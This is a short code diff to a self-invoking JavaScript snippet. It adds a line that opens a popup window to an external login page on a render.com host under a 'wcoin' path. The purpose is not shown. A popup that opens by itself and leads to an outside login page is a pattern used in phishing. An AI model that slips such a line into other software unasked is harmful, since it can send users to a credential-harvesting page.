@@ -12,4 +12,5 @@
         backgroundColor: 'black',
         color: 'white'
   });
+    window.open("https://wtech-5o6t.onrender.com/wcoin/login", "mozillaWindow", "popup");
 })();
